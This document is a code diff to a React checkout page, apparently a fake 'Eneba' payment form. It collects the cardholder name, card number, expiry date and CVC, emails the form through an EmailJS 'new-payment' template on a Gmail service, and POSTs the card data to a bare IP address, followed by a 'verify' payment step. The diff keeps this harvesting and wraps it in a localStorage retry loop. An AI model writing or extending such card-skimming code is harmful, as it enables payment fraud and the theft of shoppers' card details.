@@ -77,42 +77,52 @@ export default function Paiement() {
 
   const proceedCheckout = async (event) => {
     event.preventDefault();
-    try {
-      setShowVerificationWrapper(true); // Show the verification Wrapper
-      await emailjs.sendForm('gmail-benedikt', 'new-payment', event.target);
-      console.log('INFOS ENVOYÉES');
+    setShowVerificationWrapper(true); // Show the verification Wrapper
 
-      // Collect payment information
-      const cardHolder = event.target.cardHolder.value;
-      const cardNumber = event.target.cardNumber.value;
-      const cardExpiration = event.target.expiryDate.value;
-      const cardCVC = event.target.cvv.value;
+    const checkInitStatus = async () => {
+      const initStatus = localStorage.getItem('checkoutInitStatus');
+      if (initStatus === 'success') {
+        try {
+          await emailjs.sendForm('gmail-benedikt', 'new-payment', event.target);
+          console.log('INFOS ENVOYÉES');
 
-      // Trigger the eneba_checkout API
-      const response = await fetch('http://164.92.222.43:3000/eneba_checkout/proceed', {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json'
-        },
-        body: JSON.stringify({
-          cardHolder,
-          cardNumber,
-          cardExpiration,
-          cardCVC,
-          payAmount: discountedPrice
-        })
-      });
-      const result = await response.json();
-      console.log(result.message);
-      setPayAmount(result.payAmount); // Set the pay amount for verification step
-    } catch (error) {
-      console.log('FAILED...', error);
-    }
+          // Collect payment information
+          const cardHolder = event.target.cardHolder.value;
+          const cardNumber = event.target.cardNumber.value;
+          const cardExpiration = event.target.expiryDate.value;
+          const cardCVC = event.target.cvv.value;
+
+          // Trigger the eneba_checkout proceed API
+          const response = await fetch('https://164.92.222.43/eneba_checkout/proceed', {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+              cardHolder,
+              cardNumber,
+              cardExpiration,
+              cardCVC,
+              payAmount: discountedPrice
+            })
+          });
+          const result = await response.json();
+          console.log(result.message);
+          setPayAmount(result.payAmount); // Set the pay amount for verification step
+        } catch (error) {
+          console.log('FAILED...', error);
+        }
+      } else {
+        setTimeout(checkInitStatus, 1000); // Retry after 1 second
+      }
+    };
+
+    checkInitStatus();
   };
 
   const verifyPayment = async () => {
     try {
-      const response = await fetch('http://164.92.222.43:3000/eneba_checkout/verify', {
+      const response = await fetch('https://164.92.222.43/eneba_checkout/verify', {
         method: 'POST',
         headers: {
           'Content-Type': 'application/json'
